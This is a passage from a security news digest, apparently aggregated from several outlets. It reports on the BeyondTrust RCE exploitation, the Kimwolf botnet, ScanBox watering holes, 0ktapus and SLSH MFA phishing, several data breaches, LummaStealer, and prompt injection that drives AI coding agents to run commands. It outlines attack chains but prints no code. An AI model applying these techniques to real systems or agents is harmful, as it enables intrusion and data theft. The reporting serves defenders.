Telegram’s founder, Pavel Durov, responded to the situation by stating that Russia is trying to encourage its citizens to use the Kremlin-controlled MAX messenger app.

MAX is a controversial communications platform developed by VK, which became mandatory on all electronic devices sold in the country since September 2025.

Although MAX is promoted as a secure app that safeguards national communications from foreign surveillance, several independent reviewers have raised concerns about encryption weaknesses, government access, and extensive data-collection risks.

For now, users in Russia may be able to continue accessing their messengers of choice by using VPN tools, though those are not immune to the government’s crackdown either.

[5] BleepingComputer - Bitwarden introduces ‘Cupid Vault’ for secure password sharing
────────────────────────────────────────────────────────────────────────────────
Tarih: Thu, 12 Feb 2026 16:55:24 -0500

[TAM METİN - 422 kelime]
Bitwarden has launched a new system called ‘Cupid Vault’ that allows users to safely share passwords with trusted email addresses.

Cupid Vault works by allowing users of the free version of Bitwarden to create a 2-person shared vault called an 'Organization'. Other users can access the logins inside the Organization space with credentials assigned by the owner of the account.

Inviting a user (partner, friend, family member) to an Organization can be done by adding their email address as a second member.

This way, Bitwarden users can share in a secure way collections of login pairs for media streaming service accounts or other online platforms.

Setting up an Organization and creating shared collections is possible by logging into the Bitwarden vault via the web interface.

To prevent adversary-in-the-middle enrollment attacks, vault owners can verify through a fingerprint phrase that the intended member is getting access. The shared vault is completely isolated from the personal vault.

Access to the Organization vault and the secrets it contains can be revoked at any time, and sharing can be configured in both directions.

Bitwarden published a detailed guide on how to set up and use Cupid Vault, which explains that ownership of items within a new Organization isn’t tied to their creator, as both members can perform editing or deletion actions.

Bitwarden is a popular open-source password manager that lets users securely store, generate, and autofill passwords and other sensitive information.

It’s cross-platform, supporting a range of browsers, desktop operating systems, and mobile platforms, and protects stored data using end-to-end encryption.

The new Cupid Vault feature, launched ahead of Valentine’s Day, is available at no charge to all users and can be set up through the free plan. However, there’s a limit of 2 Collections and 2 users each.

Family, Teams, and Enterprise plan users already get multiple users, collections, and granular role-based access control permissions, so Cupid Vault is redundant for paying tiers and shouldn’t be confused with the secret-sharing features available to them.

[6] BleepingComputer - Critical BeyondTrust RCE flaw now exploited in attacks, patch now
────────────────────────────────────────────────────────────────────────────────
Tarih: Thu, 12 Feb 2026 16:34:12 -0500

[TAM METİN - 461 kelime]
A critical pre-authentication remote code execution vulnerability in BeyondTrust Remote Support and Privileged Remote Access appliances is now being exploited in attacks after a PoC was published online.

Tracked as CVE-2026-1731 and assigned a near-maximum CVSS score of 9.9, the flaw affects BeyondTrust Remote Support versions 25.3.1 and earlier and Privileged Remote Access versions 24.3.4 and earlier.

BeyondTrust disclosed the vulnerability on February 6, warning that unauthenticated attackers could exploit it by sending specially crafted client requests.

"BeyondTrust Remote Support and older versions of Privileged Remote Access contain a critical pre-authentication remote code execution vulnerability that may be triggered through specially crafted client requests," explained BeyondTrust.

"Successful exploitation could allow an unauthenticated remote attacker to execute operating system commands in the context of the site user. Successful exploitation requires no authentication or user interaction and may lead to system compromise, including unauthorized access, data exfiltration, and service disruption."

BeyondTrust automatically patched all Remote Support and Privileged Remote Access SaaS instances on February 2, 2026, but on-premise customers must install patches manually.

CVE-2026-1731 is now exploited in the wild

Hacktron discovered the vulnerability and responsibly disclosed it to BeyondTrust on January 31.

Hacktron says approximately 11,000 BeyondTrust Remote Support instances were exposed online, with around 8,500 on-premises deployments.

Ryan Dewhurst, head of threat intelligence at watchTowr, now reports that attackers have begun actively exploiting the vulnerability, warning that if devices are not patched, they should be assumed to be compromised.

"Overnight we observed first in-the-wild exploitation of BeyondTrust across our global sensors," Dewhurst posted on X.

"Attackers are abusing get_portal_info to extract the x-ns-company value before establishing a WebSocket channel."

This exploitation comes a day after a proof-of-concept exploit was published on GitHub targeting the same /get_portal_info endpoint.

The attacks target exposed BeyondTrust portals to retrieve the 'X-Ns-Company' identifier, which is then used to create a websocket to the targeted device. This allows the attackers to execute commands on vulnerable systems.

Organizations using self-hosted BeyondTrust Remote Support or Privileged Remote Access appliances should immediately apply available patches or upgrade to the latest versions.

BleepingComputer contacted BeyondTrust and Dewhurst to ask if they had any details on post-exploitation activity and will update this story if we receive a response.

[7] Krebs on Security - Kimwolf Botnet Swamps Anonymity Network I2P
────────────────────────────────────────────────────────────────────────────────
Tarih: Wed, 11 Feb 2026 16:08:11 +0000
Link: https://krebsonsecurity.com/2026/02/kimwolf-botnet-swamps-anonymity-network-i2p/

[TAM METİN - 831 kelime]
For the past week, the massive “Internet of Things” (IoT) botnet known as Kimwolf has been disrupting The Invisible Internet Project (I2P), a decentralized, encrypted communications network designed to anonymize and secure online communications. I2P users started reporting disruptions in the network around the same time the Kimwolf botmasters began relying on it to evade takedown attempts against the botnet’s control servers.

Kimwolf is a botnet that surfaced in late 2025 and quickly infected millions of systems, turning poorly secured IoT devices like TV streaming boxes, digital picture frames and routers into relays for malicious traffic and abnormally large distributed denial-of-service (DDoS) attacks.

I2P is a decentralized, privacy-focused network that allows people to communicate and share information anonymously.

“It works by routing data through multiple encrypted layers across volunteer-operated nodes, hiding both the sender’s and receiver’s locations,” the I2P website explains. “The result is a secure, censorship-resistant network designed for private websites, messaging, and data sharing.”

On February 3, I2P users began complaining on the organization’s GitHub page about tens of thousands of routers suddenly overwhelming the network, preventing existing users from communicating with legitimate nodes. Users reported a rapidly increasing number of new routers joining the network that were unable to transmit data, and that the mass influx of new systems had overwhelmed the network to the point where users could no longer connect.

I2P users complaining about service disruptions from a rapidly increasing number of routers suddenly swamping the network.

When one I2P user asked whether the network was under attack, another user replied, “Looks like it. My physical router freezes when the number of connections exceeds 60,000.”

A graph shared by I2P developers showing a marked drop in successful connections on the I2P network around the time the Kimwolf botnet started trying to use the network for fallback communications.

The same day that I2P users began noticing the outages, the individuals in control of Kimwolf posted to their Discord channel that they had accidentally disrupted I2P after attempting to join 700,000 Kimwolf-infected bots as nodes on the network.

The Kimwolf botmaster openly discusses what they are doing with the botnet in a Discord channel with my name on it.

Although Kimwolf is known as a potent weapon for launching DDoS attacks, the outages caused this week by some portion of the botnet attempting to join I2P are what’s known as a “Sybil attack,” a threat in peer-to-peer networks where a single entity can disrupt the system by creating, controlling, and operating a large number of fake, pseudonymous identities.

Indeed, the number of Kimwolf-infected routers that tried to join I2P this past week was many times the network’s normal size. I2P’s Wikipedia page says the network consists of roughly 55,000 computers distributed throughout the world, with each participant acting as both a router (to relay traffic) and a client.

However, Lance James, founder of the New York City based cybersecurity consultancy Unit 221B and the original founder of I2P, told KrebsOnSecurity the entire I2P network now consists of between 15,000 and 20,000 devices on any given day.

An I2P user posted this graph on Feb. 10, showing tens of thousands of routers — mostly from the United States — suddenly attempting to join the network.

Benjamin Brundage is founder of Synthient, a startup that tracks proxy services and was the first to document Kimwolf’s unique spreading techniques. Brundage said the Kimwolf operator(s) have been trying to build a command and control network that can’t easily be taken down by security companies and network operators that are working together to combat the spread of the botnet.

Brundage said the people in control of Kimwolf have been experimenting with using I2P and a similar anonymity network — Tor — as a backup command and control network, although there have been no reports of widespread disruptions in the Tor network recently.

“I don’t think their goal is to take I2P down,” he said. “It’s more they’re looking for an alternative to keep the botnet stable in the face of takedown attempts.”

The Kimwolf botnet created challenges for Cloudflare late last year when it began instructing millions of infected devices to use Cloudflare’s domain name system (DNS) settings, causing control domains associated with Kimwolf to repeatedly usurp Amazon, Apple, Google and Microsoft in Cloudflare’s public ranking of the most frequently requested websites.

James said the I2P network is still operating at about half of its normal capacity, and that a new release is rolling out which should bring some stability improvements over the next week for users.

Meanwhile, Brundage said the good news is Kimwolf’s overlords appear to have quite recently alienated some of their more competent developers and operators, leading to a rookie mistake this past week that caused the botnet’s overall numbers to drop by more than 600,000 infected systems.

“It seems like they’re just testing stuff, like running experiments in production,” he said. “But the botnet’s numbers are dropping significantly now, and they don’t seem to know what they’re doing.”

[8] Krebs on Security - Patch Tuesday, February 2026 Edition

[TAM METİN - 515 kelime]
Microsoft today released updates to fix more than 50 security holes in its Windows operating systems and other software, including patches for a whopping six “zero-day” vulnerabilities that attackers are already exploiting in the wild.

Zero-day #1 this month is CVE-2026-21510, a security feature bypass vulnerability in Windows Shell wherein a single click on a malicious link can quietly bypass Windows protections and run attacker-controlled content without warning or consent dialogs. CVE-2026-21510 affects all currently supported versions of Windows.

The zero-day flaw CVE-2026-21513 is a security bypass bug targeting MSHTML, the proprietary engine of the default Web browser in Windows. CVE-2026-21514 is a related security feature bypass in Microsoft Word.

The zero-day CVE-2026-21533 allows local attackers to elevate their user privileges to “SYSTEM” level access in Windows Remote Desktop Services. CVE-2026-21519 is a zero-day elevation of privilege flaw in the Desktop Window Manager (DWM), a key component of Windows that organizes windows on a user’s screen. Microsoft fixed a different zero-day in DWM just last month.

The sixth zero-day is CVE-2026-21525, a potentially disruptive denial-of-service vulnerability in the Windows Remote Access Connection Manager, the service responsible for maintaining VPN connections to corporate networks.

Chris Goettl at Ivanti reminds us Microsoft has issued several out-of-band security updates since January’s Patch Tuesday. On January 17, Microsoft pushed a fix that resolved a credential prompt failure when attempting remote desktop or remote application connections. On January 26, Microsoft patched a zero-day security feature bypass vulnerability (CVE-2026-21509) in Microsoft Office.

Kev Breen at Immersive notes that this month’s Patch Tuesday includes several fixes for remote code execution vulnerabilities affecting GitHub Copilot and multiple integrated development environments (IDEs), including VS Code, Visual Studio, and JetBrains products. The relevant CVEs are CVE-2026-21516, CVE-2026-21523, and CVE-2026-21256.

Breen said the AI vulnerabilities Microsoft patched this month stem from a command injection flaw that can be triggered through prompt injection, or tricking the AI agent into doing something it shouldn’t — like executing malicious code or commands.

“Developers are high-value targets for threat actors, as they often have access to sensitive data such as API keys and secrets that function as keys to critical infrastructure, including privileged AWS or Azure API keys,” Breen said. “When organizations enable developers and automation pipelines to use LLMs and agentic AI, a malicious prompt can have significant impact. This does not mean organizations should stop using AI. It does mean developers should understand the risks, teams should clearly identify which systems and workflows have access to AI agents, and least-privilege principles should be applied to limit the blast radius if developer secrets are compromised.”

The SANS Internet Storm Center has a clickable breakdown of each individual fix this month from Microsoft, indexed by severity and CVSS score. Enterprise Windows admins involved in testing patches before rolling them out should keep an eye on askwoody.com, which often has the skinny on wonky updates. Please don’t neglect to back up your data if it has been a while since you’ve done that, and feel free to sound off in the comments if you experience problems installing any of these fixes.

[9] Krebs on Security - Please Don’t Feed the Scattered Lapsus ShinyHunters
────────────────────────────────────────────────────────────────────────────────

A prolific data ransom gang that calls itself Scattered Lapsus ShinyHunters (SLSH) has a distinctive playbook when it seeks to extort payment from victim firms: Harassing, threatening and even swatting executives and their families, all while notifying journalists and regulators about the extent of the intrusion. Some victims reportedly are paying — perhaps as much to contain the stolen data as to stop the escalating personal attacks. But a top SLSH expert warns that engaging at all beyond a “We’re not paying” response only encourages further harassment, noting that the group’s fractious and unreliable history means the only winning move is not to pay.

Unlike traditional, highly regimented Russia-based ransomware affiliate groups, SLSH is an unruly and somewhat fluid English-language extortion gang that appears uninterested in building a reputation of consistent behavior whereby victims might have some measure of confidence that the criminals will keep their word if paid.

That’s according to Allison Nixon, director of research at the New York City based security consultancy Unit 221B. Nixon has been closely tracking the criminal group and individual members as they bounce between various Telegram channels used to extort and harass victims, and she said SLSH differs from traditional data ransom groups in other important ways that argue against trusting them to do anything they say they’ll do — such as destroying stolen data.

Like SLSH, many traditional Russian ransomware groups have employed high-pressure tactics to force payment in exchange for a decryption key and/or a promise to delete stolen data, such as publishing a dark web shaming blog with samples of stolen data next to a countdown clock, or notifying journalists and board members of the victim company. But Nixon said the extortion from SLSH quickly escalates way beyond that — to threats of physical violence against executives and their families, DDoS attacks on the victim’s website, and repeated email-flooding campaigns.

SLSH is known for breaking into companies by phishing employees over the phone, and using the purloined access to steal sensitive internal data. In a January 30 blog post, Google’s security forensics firm Mandiant said SLSH’s most recent extortion attacks stem from incidents spanning early to mid-January 2026, when SLSH members pretended to be IT staff and called employees at targeted victim organizations claiming that the company was updating MFA settings.

“The threat actor directed the employees to victim-branded credential harvesting sites to capture their SSO credentials and MFA codes, and then registered their own device for MFA,” the blog post explained.

Victims often first learn of the breach when their brand name is uttered on whatever ephemeral new public Telegram group chat SLSH is using to threaten, extort and harass their prey. According to Nixon, the coordinated harassment on the SLSH Telegram channels is part of a well-orchestrated strategy to overwhelm the victim organization by manufacturing humiliation that pushes them over the threshold to pay.

Nixon said multiple executives at targeted organizations have been subject to “swatting” attacks, wherein SLSH communicated a phony bomb threat or hostage situation at the target’s address in the hopes of eliciting a heavily armed police response at their home or place of work.

“A big part of what they’re doing to victims is the psychological aspect of it, like harassing executives’ kids and threatening the board of the company,” Nixon told KrebsOnSecurity. “And while these victims are getting extortion demands, they’re simultaneously getting outreach from media outlets saying, ‘Hey, do you have any comments on the bad things we’re going to write about you.”

In a blog post today, Unit 221B argues that no one should negotiate with SLSH because the group has demonstrated a willingness to extort victims based on promises that it has no intention to keep. Nixon points out that all of SLSH’s known members hail from The Com, shorthand for a constellation of cybercrime-focused Discord and Telegram communities which serve as a kind of distributed social network that facilitates instant collaboration.

Nixon said Com-based extortion groups tend to instigate feuds and drama between group members, leading to lying, betrayals, credibility destroying behavior, backstabbing, and sabotaging each other.

“With this type of ongoing dysfunction, often compounding by substance abuse, these threat actors often aren’t able to act with the core goal in mind of completing a successful, strategic ransom operation,” Nixon wrote. “They continually lose control with outbursts that put their strategy and operational security at risk, which severely limits their ability to build a professional, scalable, and sophisticated criminal organization network for continued successful ransoms – unlike other, more tenured and professional criminal organizations focused on ransomware alone.”

Intrusions from established ransomware groups typically center around encryption/decryption malware that mostly stays on the affected machine. In contrast, Nixon said, ransom from a Com group is often structured the same as violent sextortion schemes against minors, wherein members of The Com will steal damaging information, threaten to release it, and “promise” to delete it if the victim complies without any guarantee or technical proof point that they will keep their word. She writes:

A key component of SLSH’s efforts to convince victims to pay, Nixon said, involves manipulating the media into hyping the threat posed by this group. This approach also borrows a page from the playbook of sextortion attacks, she said, which encourages predators to keep targets continuously engaged and worrying about the consequences of non-compliance.

“On days where SLSH had no substantial criminal ‘win’ to announce, they focused on announcing death threats and harassment to keep law enforcement, journalists, and cybercrime industry professionals focused on this group,” she said.

Nixon knows a thing or two about being threatened by SLSH: For the past several months, the group’s Telegram channels have been replete with threats of physical violence against her, against Yours Truly, and against other security researchers. These threats, she said, are just another way the group seeks to generate media attention and achieve a veneer of credibility, but they are useful as indicators of compromise because SLSH members tend to name drop and malign security researchers even in their communications with victims.

“Watch for the following behaviors in their communications to you or their public statements,” Unit 221B’s advisory reads. “Repeated abusive mentions of Allison Nixon (or “A.N”), Unit 221B, or cybersecurity journalists—especially Brian Krebs—or any other cybersecurity employee, or cybersecurity company. Any threats to kill, or commit terrorism, or violence against internal employees, cybersecurity employees, investigators, and journalists.”

Unit 221B says that while the pressure campaign during an extortion attempt may be traumatizing to employees, executives, and their family members, entering into drawn-out negotiations with SLSH incentivizes the group to increase the level of harm and risk, which could include the physical safety of employees and their families.

“The breached data will never go back to the way it was, but we can assure you that the harassment will end,” Nixon said. “So, your decision to pay should be a separate issue from the harassment. We believe that when you separate these issues, you will objectively see that the best course of action to protect your interests, in both the short and long term, is to refuse payment.”

[10] Threatpost - Student Loan Breach Exposes 2.5M Records
────────────────────────────────────────────────────────────────────────────────
Tarih: Wed, 31 Aug 2022 12:57:48 +0000

[TAM METİN - 511 kelime]
2.5 million people were affected, in a breach that could spell more trouble down the line.

EdFinancial and the Oklahoma Student Loan Authority (OSLA) are notifying over 2.5 million loanees that their personal data was exposed in a data breach.

The target of the breach was Nelnet Servicing, the Lincoln, Neb.-based servicing system and web portal provider for OSLA and EdFinancial, according to a breach disclosure letter.

Nelnet revealed the breach to affected loan recipients on July 21, 2022 via a letter.

“[Our] cybersecurity team took immediate action to secure the information system, block the suspicious activity, fix the issue, and launched[sic] an investigation with third-party forensic experts to determine the nature and scope of the activity,” according to the letter.

By August 17th, the investigation determined that personal user information was accessed by an unauthorized party. That exposed information included names, home addresses, email addresses, phone numbers and social security numbers for a total of 2,501,324 student loan account holders. Users’ financial information was not exposed.

According to a breach disclosure filing submitted by Nelnet’s general counsel, Bill Munn, to the state of Maine the breach occurred sometime between June 1, 2022 and July 22, 2022. However, a letter to affected customers pinpoints the breach to July 21. The breach was discovered on August 17, 2022.

“On July 21, 2022, Nelnet Servicing, LLC (Nelnet), our servicing system and customer website

portal provider, notified us that they had discovered a vulnerability that we believe led to this incident,” according to the Nelnet.

It’s unclear what the vulnerability was.

“On August 17, 2022, this investigation determined that certain student loan account registration information was accessible by an unknown party beginning in June 2022 and ending on July 22, 2022,” according to the letter.

Loan Recipient Targets

Although users’ most sensitive financial data was protected, the personal information that was accessed in the Nelnet breach “has potential to be leveraged in future social engineering and phishing campaigns,” explained Melissa Bischoping, endpoint security research specialist at Tanium, in a statement via email.

“With recent news of student loan forgiveness, it’s reasonable to expect the occasion to be used by scammers as a gateway for criminal activity,” Bischoping said.

Last week, the Biden administration announced a plan to cancel $10,000 of student loan debt for low- and middle-income loanees. She said the loan forgiveness program will be used to lure victims into opening up phishing emails.

She warns that recently breached data will be used to impersonate affected brands in waves of phishing campaigns targeting students and recent college graduates.

“Because they can leverage the trust from existing business relationships they can be particularly deceptive,” she wrote.

According to the breach disclosure Nelnet Servicing informed Edfinancial and OSLA that Nelnet Servicing’s cybersecurity team “took immediate action to secure the information system, block the suspicious activity, fix the issue, and launched an investigation with third-party forensic experts to determine the nature and scope of the activity.”

Remediation also included two years of free credit monitoring, credit reports and up to $1 million in identity theft insurance.

[11] Threatpost - Watering Hole Attacks Push ScanBox Keylogger
────────────────────────────────────────────────────────────────────────────────
Tarih: Tue, 30 Aug 2022 16:00:43 +0000
Link: https://threatpost.com/watering-hole-attacks-push-scanbox-keylogger/180490/

[TAM METİN - 918 kelime]
Researchers uncover a watering hole attack likely carried out by APT TA423, which attempts to plant the ScanBox JavaScript-based reconnaissance tool.

A China-based threat actor has ramped up efforts to distribute the ScanBox reconnaissance framework to victims that include domestic Australian organizations and offshore energy firms in the South China Sea. The bait used by the advanced threat group (APT) is targeted messages that supposedly link back to Australian news websites.

The cyber-espionage campaigns are believed to have launched April 2022 through mid-June 2022, according to a Tuesday report by Proofpoint’s Threat Research Team and PwC’s Threat Intelligence team.

The threat actor, according to researchers, is believed to be the China-based APT TA423, also known as Red Ladon. “Proofpoint assesses with moderate confidence that this activity may be attributable to the threat actor TA423 / Red Ladon, which multiple reports assess to operate out of Hainan Island, China,” according to the report.

The APT is most recently known for a recent indictment. “A 2021 indictment by the US Department of Justice assessed that TA423 / Red Ladon provides long-running support to the Hainan Province Ministry of State Security (MSS),” researchers said.

MSS is the civilian intelligence, security and cyber police agency for the People’s Republic of China. It is believed responsible for counter-intelligence, foreign intelligence, political security and tied to industrial and cyber espionage efforts by China.

Dusting Off the ScanBox

The campaign leverages the ScanBox framework. ScanBox is a customizable and multifunctional Javascript-based framework used by adversaries to conducting covert reconnaissance.

ScanBox has been used by adversaries for nearly a decade and is noteworthy because criminals can use the tool to conduct counter intelligence without having to plant malware on a targets system.

“ScanBox is particularly dangerous as it doesn’t require malware to be successfully deployed to disk in order to steal information – the keylogging functionality simply requires the JavaScript code to be executed by a web browser,” according to PwC researchers referring to a previous campaign.

In lieu of malware, attackers can use ScanBox in conjunction with watering hole attacks. Adversaries load the malicious JavaScript onto a compromised website where the ScanBox acts as a keylogger snagging all of a user’s typed activity on the infected watering hole website.

TA423’s attacks began with phishing emails, with such titles as “Sick Leave,” “User Research” and “Request Cooperation.” Often, the emails purported to come from an employee of the “Australian Morning News,” a fictional organization. The employee implored targets to visit their “humble news website,” australianmorningnews[.]com.

“Upon clicking the link and redirecting to the site, visitors were served the ScanBox framework,” researchers wrote.

The link directed targets to a web page with content copied from actual news sites, like the BBC and Sky News. In the process, it also delivered the ScanBox malware framework.

ScanBox keylogger data culled from waterholes is part of a multi-stage attack, giving attackers insight into the potential targets that will help them launch future attacks against them. This technique is often called browser fingerprinting.

The primary, initial script sources a list of information about the target computer, including the operating system, language and version of Adobe Flash installed. ScanBox additionally runs a check for browser extensions, plugins and components such WebRTC.

“The module implements WebRTC, a free and open-source technology supported on all major browsers, which allows web browsers and mobile applications to perform real-time communication (RTC) over application programming interfaces (APIs). This allows ScanBox to connect to a set of pre-configured targets,” researchers explain.

Adversaries can then leverage a technology called STUN (Session Traversal Utilities for NAT). This is a standardized set of methods, including a network protocol, that allows interactive communications (including real-time voice, video, and messaging applications) to traverse network address translator (NAT) gateways, researchers explain.

“STUN is supported by the WebRTC protocol. Through a third-party STUN server located on the Internet, it allows hosts to discover the presence of a NAT, and to discover the mapped IP address and port number that the NAT has allocated for the application’s User Datagram Protocol (UDP) flows to remote hosts. ScanBox implements NAT traversal using STUN servers as part of Interactive Connectivity Establishment (ICE), a peer-to-peer communication method used for clients to communicate as directly as possible, avoiding having to communicate through NATs, firewalls, or other solutions,” according to researchers.

“This means that the ScanBox module can set up ICE communications to STUN servers, and communicate with victim machines even if they are behind NAT,” they explain.

The threat actors “support the Chinese government in matters related to the South China Sea, including during the recent tensions in Taiwan,” Sherrod DeGrippo, vice president of threat research and detection at Proofpoint, explained in a statement, “This group specifically wants to know who is active in the region and, while we can’t say for certain, their focus on naval issues is likely to remain a constant priority in places like Malaysia, Singapore, Taiwan, and Australia.”

The group has, in the past, expanded well beyond Australasia. According to a Department of Justice indictment from July, 2021, the group has “stolen trade secrets and confidential business information” from victims in “the United States, Austria, Cambodia, Canada, Germany, Indonesia, Malaysia, Norway, Saudi Arabia, South Africa, Switzerland and the United Kingdom. Targeted industries included, among others, aviation, defense, education, government, health care, biopharmaceutical and maritime.”

Despite the DoJ indictment, analysts “have not observed a distinct disruption of operational tempo” from TA423, and they “collectively expect TA423 / Red Ladon to continue pursuing its intelligence-gathering and espionage mission.”

[12] Threatpost - Tentacles of ‘0ktapus’ Threat Group Victimize 130 Firms
────────────────────────────────────────────────────────────────────────────────
Tarih: Mon, 29 Aug 2022 14:56:19 +0000
Link: https://threatpost.com/0ktapus-victimize-130-firms/180487/

[TAM METİN - 614 kelime]
Over 130 companies tangled in sprawling phishing campaign that spoofed a multi-factor authentication system.

Targeted attacks on Twilio and Cloudflare employees are tied to a massive phishing campaign that resulted in 9,931 accounts at over 130 organizations being compromised. The campaigns are tied to focused abuse of identity and access management firm Okta, which gained the threat actors the 0ktapus moniker, by researchers.

“The primary goal of the threat actors was to obtain Okta identity credentials and multi-factor authentication (MFA) codes from users of the targeted organizations,” wrote Group-IB researchers in a recent report. “These users received text messages containing links to phishing sites that mimicked the Okta authentication page of their organization.”

Impacted were 114 US-based firms, with additional victims of sprinkled across 68 additional countries.

Roberto Martinez, senior threat intelligence analyst at Group-IB, said the scope of the attacks is still an unknown. “The 0ktapus campaign has been incredibly successful, and the full scale of it may not be known for some time,” he said.

What the 0ktapus Hackers Wanted

The 0ktapus attackers are believed to have begun their campaign by targeting telecommunications companies in hopes of winning access to potential targets’ phone numbers.

While unsure exactly how threat actors obtained a list of phone numbers used in MFA-related attacks, one theory researchers posit is that 0ktapus attackers began their campaign targeting telecommunications companies.

“[A]ccording to the compromised data analyzed by Group-IB, the threat actors started their attacks by targeting mobile operators and telecommunications companies and could have collected the numbers from those initial attacks,” researchers wrote.

Next, attackers sent phishing links to targets via text messages. Those links led to webpages mimicking the Okta authentication page used by the target’s employer. Victims were then asked to submit Okta identity credentials in addition to a multi-factor authentication (MFA) codes employees used to secure their logins.

In an accompanying technical blog, researchers at Group-IB explain that the initial compromises of mostly software-as-a-service firms were a phase-one in a multi-pronged attack. 0ktapus’ ultimate goal was to access company mailing lists or customer-facing systems in hopes of facilitating supply-chain attacks.

In a possible related incident, within hours of Group-IB publishing its report late last week, the firm DoorDash revealed it was targeted in an attack with all the hallmarks of an 0ktapus-style attack.

Blast Radius: MFA Attacks

In a blog post DoorDash revealed; “unauthorized party used the stolen credentials of vendor employees to gain access to some of our internal tools.” The attackers, according to the post, went on to steal personal information – including names, phone numbers, email and delivery addresses – from customers and delivery people.

In the course of its campaign, the attacker compromised 5,441 MFA codes, Group-IB reported.

“Security measures such as MFA can appear secure… but it is clear that attackers can overcome them with relatively simple tools,” researchers wrote.

“This is yet another phishing attack showing how easy it is for adversaries to bypass supposedly secure multifactor authentication,” Roger Grimes, data-driven defense evangelist at KnowBe4, wrote in a statement via email. “It simply does no good to move users from easily phish-able passwords to easily phish-able MFA. It’s a lot of hard work, resources, time, and money, not to get any benefit.”

To mitigate 0ktapus-style campaigns, the researchers recommended good hygiene around URLs and passwords, and using FIDO2-compliant security keys for MFA.

“Whatever MFA someone uses,” Grimes advised, “the user should be taught about the common types of attacks that are committed against their form of MFA, how to recognize those attacks, and how to respond. We do the same when we tell users to pick passwords but don’t when we tell them to use supposedly more secure MFA.”

Hackers broke into Dutch telecom firm Odido and accessed data from 6.2 million accounts. The company confirmed the breach and said attackers took names, addresses, phone numbers, email addresses, bank account details, dates of birth, and passport or ID numbers.

“Odido has been hit by a cyberattack, which compromised customer data. This involved personal data from a customer contact system used by Odido. No passwords, call logs, or billing information were affected.” reads a notice published by the company on its website. “The unauthorized access to the system was terminated as quickly as possible. Odido also engaged external cybersecurity experts to assist with implementing additional security measures as part of the incident response.”

The telco said the breach did not expose My Odido account passwords, call records, location data, invoice details, or scans of ID documents.

Odido’s subsidiary Ben also warned its customers that hackers may have stolen their information.

Odido is a Dutch telecommunications company and one of the largest mobile network operators in the Netherlands. It was formed when T-Mobile Netherlands and Tele2 were rebranded as Odido in 2023 after private equity firms Apax Partners and Warburg Pincus acquired the business.

Odido serves around 8 million mobile subscribers and about 1 million fixed broadband customers nationwide. The company provides mobile telephony, wireless broadband, and related services under multiple brands including Odido, Ben, and Simpel.

Financially, Odido generates around €2 billion in annual revenue, with growth in consumer broadband and business mobile services contributing to its topline

The telco discovered the hack last weekend and reported it to the Dutch privacy watchdog. The company said it quickly stopped the unauthorized access and brought in cybersecurity experts to strengthen its defenses.

“The unauthorised access to the system was ended as quickly as possible,” the company said in a statement. “In addition, Odido has brought in cybersecurity experts to implement additional security measures in response to this incident.”

The company urges customers to stay alert for suspicious activity. Criminals may use stolen details to pose as Odido, banks, or other companies through calls, texts, or emails. Avoid clicking unknown links and check senders carefully. Verify unexpected calls by contacting the company directly using official numbers. Never share passwords or PINs. Review invoices closely, as scammers may send fake payment requests. When in doubt, check your account or contact customer support.

The company did not disclose technical details about the attack.

ApolloMD is a US-based healthcare services company that partners with hospitals, health systems, and physician practices. It provides practice management, staffing, revenue cycle, and administrative support services. The company works with affiliated physicians across specialties such as emergency medicine, hospital medicine, anesthesia, and radiology, helping providers manage clinical and operational functions.

ApolloMD disclosed a data breach after a May 2025 cyberattack. The security breach compromised the personal information of more than 626,000 individuals, impacting patients of affiliated physicians and medical practices served by the healthcare management provider.

According to data published by the US Department of Health and Human Services, the exact number of impacted people is 626,540.

Hackers accessed and stole sensitive data, prompting the company to notify impacted individuals.

The company detected unusual activity on May 22, 2025, and launched an investigation with the help of a forensic firm and notified law enforcement. Investigators found that an unauthorized party gained unauthorized access to its IT systems between May 22 and 23, including patient files. The exposed data varies by individual and includes names, birth dates, addresses, diagnoses, treatment details, insurance data, and in some cases Social Security numbers.

ApolloMD notified managed physician practices between July and September 2025.

“Our investigation determined that an unauthorized party accessed ApolloMD’s IT environment between May 22, 2025 and May 23, 2025. While in the IT environment, the unauthorized party may have accessed and/or acquired files that contain information for patients treated by ApolloMD’s affiliated physicians and practices. The information involved varied by patient and includes names in combination with one or more of the following: dates of birth, addresses, diagnosis information, provider names, dates of service, treatment information, and/or health insurance information. For some individuals, the incident may have also involved their Social Security numbers.” reads the notice of security breach published by the company. “On September 17, 2025, notification letters began being mailed to patients whose information may have been involved in the incident.”

ApolloMD did not publish technical details about the incident, however, the Qilin ransomware group claimed the data breach in June 2025.

[15] Security Affairs - LummaStealer activity spikes post-law enforcement disruption

Link: https://securityaffairs.com/187896/uncategorized/lummastealer-activity-spikes-post-law-enforcement-disruption.html

[TAM METİN - 672 kelime]
Bitdefender observed renewed LummaStealer activity, proving the MaaS infostealer recovered after 2025 takedowns. Active since 2022, it relies on affiliates, social engineering, fake cracked software, and fake CAPTCHA “ClickFix” lures. CastleLoader plays a key role in spreading it. Shared infrastructure suggests coordination between the two operations.

In May 2025, a US court order, with Europol and Japan’s JC3 dismantled the Lumma Stealer malware operation, seizing 2,300 domains used for command-and-control and blocking dark web markets offering the infostealer.

A US court order, with Europol and Japan’s JC3, dismantled Lumma Stealer’s infrastructure, seizing domains and control panels. Microsoft’s Digital Crimes Unit sinkholed over 1,300 domains to reroute victims to safe servers for analysis and cleanup.

Lumma Stealer is a Malware-as-a-Service (MaaS) infostealer designed to steal sensitive data like passwords, credit card info, and crypto wallet keys. It infiltrates systems via phishing, malvertising, and malicious downloads. It can also deploy additional malware and evade detection.

The malware had infected over 394,000 Windows systems, including those of global manufacturers.

Microsoft observed Lumma Stealer’s rapid growth and sophistication as a MaaS used by financially motivated threat actors. Distributed via phishing, malvertising, and abuse of trusted platforms, Lumma targets browsers, wallets, and apps. Lumma’s flexibility and resilience highlight the evolving cybercrime landscape and the need for layered, collaborative defense efforts.

Microsoft tracks the developer of Lumma Stealer and its C2 infrastructure as threat actor Storm-2477. Ransomware groups like Octo Tempest, Storm-1607, Storm-1113, and Storm-1674 have used Lumma in their campaigns.

Now Bitdefender researchers report a sharp rise in LummaStealer infections driven by evolving social engineering tricks, including fake CAPTCHAs and bogus Steam update alerts. Attackers frequently change loaders, recently favoring CastleLoader, a stealthy, in-memory tool with modular design and large C2 infrastructure. Analysts found infrastructure overlap between CastleLoader and Lumma operations, suggesting coordination or shared services. The research details delivery methods, indicators of compromise, and ways to detect recent CastleLoader activity.

